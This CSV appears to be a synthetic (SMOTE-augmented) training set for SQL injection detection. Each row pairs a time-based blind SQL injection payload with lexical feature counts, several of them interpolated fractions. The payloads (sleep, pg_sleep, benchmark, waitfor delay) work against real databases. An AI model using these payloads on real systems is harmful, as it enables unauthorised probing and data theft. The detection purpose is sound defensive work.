id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000129,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,0.9735294951343425,70.69837868438711,23.976215986709672,3.5801243681110146,16.674594671096777,19.65081065780645,26.6983786843871,7.674594671096775,0.23584525708422938,0.2785108603673835,0.37719131170609327,0.10845257084229391,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.674594671096775,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.3254053289032245,0.6745946710967756,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000067,2.867803763561342,94.22599413529971,22.76365982451634,3.0214478939518123,19.914322581382816,10.0,48.92466862156676,15.387002932350141,0.20970198674653223,0.10623542071451261,0.5200912130732513,0.1639713794657038,0.0,4.0,0.0,0.0,0.0,1.4623343107833802,0.0,8.0,0.9246686215667606,0.0,1.0,1.4623343107833802,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4623343107833802,0.5376656892166197,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000131,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.5064524621944948,73.324674115613,22.0,3.22100888531253,19.0,10.0,34.7068635276683,9.617810587944716,0.2596932097260398,0.1366806366979157,0.47248449386443725,0.1311416597116072,0.0,0.0,2.0,0.0,0.0,1.0,0.0,5.6178105879447156,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000036,1.2459715691934676,66.59131848643662,26.20434075678169,3.7566859992038064,23.0,10.0,24.59131848643662,9.0,0.3460776799659438,0.15046855650693208,0.36803206267088523,0.13542170085623886,2.40144691892723,0.0,0.0,0.0,0.0,1.0,0.0,3.59855308107277,0.0,0.0,0.0,2.59855308107277,1.0,0.0,0.0,0.4014469189272297,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000133,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000106,0.4666642465539888,97.57261739830533,23.0,3.244723862285316,31.572617398305326,9.893154349576331,45.106845650423665,11.0,0.32346860055233945,0.10136810163649883,0.4624080645698849,0.11275523324127676,0.0,0.0,0.0,0.0,1.0,1.0,0.0,8.106845650423669,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.8931543495763312,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.8931543495763312,1.0,0.10684565042366889,0.8931543495763312,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.893154349576331
SMOTE_000134,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000028,1.2433180235650623,92.77357296964753,23.84904864643169,3.1291338638527093,30.31131080803961,1.4622621616079226,45.537737838392076,15.462262161607923,0.32619883444136966,0.015605326571188127,0.49152917232077553,0.16666666666666666,3.462262161607922,0.0,0.0,0.0,1.0,1.0,0.0,8.537737838392077,1.462262161607922,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000135,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000033,0.1729286281969068,79.33448655382035,26.91637836154491,3.3855766565223626,20.0,10.0,37.334486553820355,12.0,0.2521443143089207,0.12607215715446035,0.47049693995126657,0.1512865885853524,1.0,0.0,2.0,0.0,0.0,1.0,0.0,6.083621638455089,0.9163783615449113,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,time,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000136,0.49783380093120594,75.37764242216205,27.874119192612646,3.749581250277195,16.881165651711473,20.244715155675877,28.125880807387354,10.125880807387354,0.22359746070491754,0.2689612215060321,0.37313967055273745,0.13430164723631297,0.0,1.2517616147747068,0.0,0.0,0.0,1.0,0.0,5.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.8741191926126467,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.1258808073873534,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1258808073873534
SMOTE_000137,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000070,0.9138618276808917,69.0,24.060358058406933,3.498199879297856,21.060358058406933,10.0,29.4547314561948,8.484910485398267,0.3052225805566222,0.14492753623188406,0.42688016603180867,0.12296971717968501,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.484910485398266,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.9707328062912328,56.59581603510192,23.319163207020384,3.815141334899629,23.0,5.2766528280815335,17.63832641404077,10.680836792979617,0.40791502970423943,0.09058255703610538,0.31132281962951314,0.19017959363014206,5.361673585959233,0.0,0.3191632070203835,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.3191632070203834,1.0,0.0,0.15958160351019174,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.15958160351019157,0.0,0.8404183964898083,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000139,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000049,0.21101093081599945,59.11500415378691,18.884995846213084,3.248091112902019,23.884995846213084,1.0,25.230008307573833,9.0,0.4041274396320328,0.0169171980678558,0.42670057968940905,0.15225478261070235,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.057502076893458,0.0,0.9424979231065417,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05750207689345843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.057502076893458
SMOTE_000140,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.19380735783804942,84.73832673377979,19.17038309241072,2.888025990407238,27.056794364136906,2.0,43.56794364136907,12.113588728273813,0.31956748954043274,0.023628294861615162,0.5138634286110052,0.14294078698694684,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.113588728273813,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.05679436413690653,0.9432056358630936,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000141,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",nearest_attack_euclidean,R000115,1.282368122994364,82.0200741267052,28.5033456877842,3.9159348955504956,29.013382751136795,15.0,28.006691375568398,10.0,0.35237957065572384,0.18367427688951202,0.34149663452842277,0.12244951792634134,0.7449814683237009,2.255018531676299,0.0,0.0,0.0,1.0,0.0,4.751672843892099,0.24832715610790032,0.0,1.0,1.0,0.24832715610790035,0.7516728438920997,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000142,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000073,1.0857415460024302,63.96359781501723,24.28051397357389,3.7196689812971764,22.28051397357389,10.0,22.68308384144334,9.0,0.3488061511059378,0.15670033236321357,0.35346321740395636,0.14103029912689222,2.7194860264261096,0.0,0.0,0.0,0.0,1.0,0.0,3.2805139735738904,0.0,0.0,0.0,2.2805139735738904,1.0,0.0,0.0,0.7194860264261096,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.28051397357389035,0.7194860264261096,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000143,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000072,0.7019761974924,75.93922968686655,17.82931151302454,2.8519436512998046,25.621983634768405,1.2073278782561339,38.69526241732975,10.41465575651227,0.3390265689150887,0.015565991689190345,0.5079741491636975,0.13743329023202347,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.41465575651227,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.20732787825613475,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.207327878256135
SMOTE_000144,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R000042,0.0003777563370197495,95.99853475003597,21.999674388896885,2.9407309299019384,20.999837194448443,9.999348777793767,49.999511583345324,14.999837194448443,0.21875202202407784,0.10416027446151736,0.5208368555688239,0.15625084794558103,4.0,0.0,0.0,0.0,0.0,1.9999185972242208,0.0,8.0,0.0,0.0,0.9999185972242209,1.9999185972242208,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.000081402775779,0.9999185972242209,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000145,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000119,0.19876809500053377,64.07786199975715,22.0,3.3713605236497752,18.077861999757147,10.0,28.0,8.0,0.2821109740357761,0.15606283173135302,0.43697592884778846,0.12485026538508241,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.07786199975714658,0.9221380002428532,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000148,0.3356082485236138,78.49316186607642,23.0,3.396778479602473,26.758905898572227,4.0,33.915076543575026,13.819179423929171,0.3423629776140261,0.051369852849021444,0.42976033140302894,0.17650683813392357,6.0,0.0,0.0,0.0,0.0,0.06027352535694308,0.0,5.758905898572228,0.0,0.0,0.0,0.06027352535694308,1.0,0.0,0.0,0.0,0.0,0.06027352535694308,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,1.0848553416420665,70.76702337438091,21.0,3.1166769654005497,21.255674458126972,4.045395665015768,34.465953251238176,11.0,0.3003502389837356,0.0562903424270728,0.48786768808394504,0.15549173050524656,4.0,0.0,0.0,0.0,0.0,1.2556744581269712,0.0,5.488651083746057,0.0,0.0,0.2556744581269711,1.255674458126971,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.255674458126971,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.255674458126971
SMOTE_000148,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000019,1.055921185335211,63.831442304866385,22.584278847566807,3.4166195780294397,19.0,10.0,27.831442304866385,7.0,0.29772957172345266,0.15669977459129086,0.4358808114713528,0.10968984221390361,0.0,0.584278847566807,0.0,0.0,0.0,1.0,0.0,4.415721152433193,0.0,1.0,0.0,1.0,0.0,0.5842788475668071,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000149,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000051,1.5694619694801981,85.65733056170059,25.0,3.189615026512135,30.0,2.0,41.12586444936047,12.531466112340118,0.3505312271562133,0.023368748477080897,0.4798481458639918,0.14625187850271396,0.531466112340118,0.468533887659882,0.0,0.0,1.0,0.0,0.0,8.531466112340118,1.0,0.0,0.0,1.0,0.5314661123401181,0.46853388765988213,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000150,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000046,1.0126181850935352,71.35926603803726,26.98055047147205,3.7776542972099945,16.339816509509316,20.320366980981365,25.35926603803727,9.339816509509317,0.2289650384280031,0.2853052320212187,0.35492784512542747,0.13080188442535073,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.339816509509317,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.6601834904906828,0.33981650950931713,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000077,0.11283743250164288,63.77789524873328,23.03172925018096,3.3990579833791883,18.0,10.0,27.809624498914236,7.968270749819039,0.282345911601645,0.15685883977869167,0.43586483030865664,0.12493041831100667,0.9682707498190395,0.03172925018096051,2.0,0.0,0.0,1.0,0.0,3.9682707498190397,0.0,0.0,0.0,3.0,0.9682707498190394,0.03172925018096051,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,0.09423665180098226,66.0,25.942305492865312,3.6309371928313103,19.971152746432654,10.0,27.0,9.028847253567346,0.3025932234307978,0.15151515151515152,0.4090909090909091,0.13680071596314158,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.028847253567344494,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9711527464326555,0.028847253567344522,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000153,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000105,0.7042830893491624,90.39353657422987,28.0,3.836315650385196,26.0,21.2175942340209,31.74075387216718,11.435188468041796,0.2883113003983039,0.23506474110824283,0.3502502575210991,0.12637370097235415,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.435188468041795,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.2175942340208974,0.7824057659791024,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000038,2.059439772744291,65.35621794840446,22.839054487101116,3.4427133939044627,15.459763621775279,13.678108974202233,27.298818108876397,8.919527243550558,0.2391246553674043,0.20497859762807197,0.4192511653319476,0.13664558167257612,0.4597636217752792,0.0,2.0,0.0,0.0,1.4597636217752792,0.0,4.0,0.0,0.0,1.0,3.4597636217752794,0.45976362177527924,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4597636217752791,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.459763621775279
SMOTE_000155,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000129,0.7918108493149828,64.69778009645421,24.39556019290843,3.451980794678527,18.697780096454217,10.0,28.0,8.0,0.2889658376050226,0.15457264399890813,0.4328034031969428,0.1236581151991265,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6977800964542151,0.3022199035457849,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000106,0.5244736104120227,98.24079886757828,23.240798867578278,3.267169285088835,32.0,10.0,45.0,11.240798867578278,0.3257363879857241,0.10179262124553878,0.4580667956049245,0.11440419516381263,0.2407988675782773,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,0.2407988675782773,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000157,attack,time,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.6452229281029379,74.0,26.60651486795889,3.680861217445907,16.196742566020554,20.60651486795889,28.0,9.196742566020555,0.21887489954081832,0.27846641713457954,0.3783783783783784,0.12428030494622372,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.19674256602055498,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.8032574339794449,0.19674256602055504,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000158,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000068,0.6682097605195936,89.99667531221802,28.0,3.83781167031834,20.0,29.0,30.79734024977441,10.199335062443604,0.22233642048238583,0.32238780969945946,0.3419869738062852,0.11328879601186953,0.8006649375563971,0.19933506244360283,2.0,0.0,0.0,2.0,0.0,4.199335062443603,0.0,0.0,1.0,4.0,0.8006649375563972,0.19933506244360283,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000159,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,1.0113583548309062,87.85286151739896,19.889121888630527,2.867842831962373,27.296373962876842,2.0,45.96373962876843,12.592747925753685,0.31171675894843925,0.02286380424217012,0.5221258079980845,0.14329362881130608,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.592747925753685,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.2963739628768428,0.7036260371231571,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000160,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000089,0.30737290083162044,92.91474159810049,24.744224794301463,3.4269077925414066,39.65896639240195,1.0,40.170516803799025,12.085258401899512,0.4267992298468165,0.01076265292214812,0.43235956040548035,0.13007855682555503,3.0,0.0,0.0,0.0,1.0,0.08525840189951284,0.0,8.0,0.0,0.0,0.0,1.0852584018995128,1.0,0.0,0.0,0.0,0.0,0.08525840189951284,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
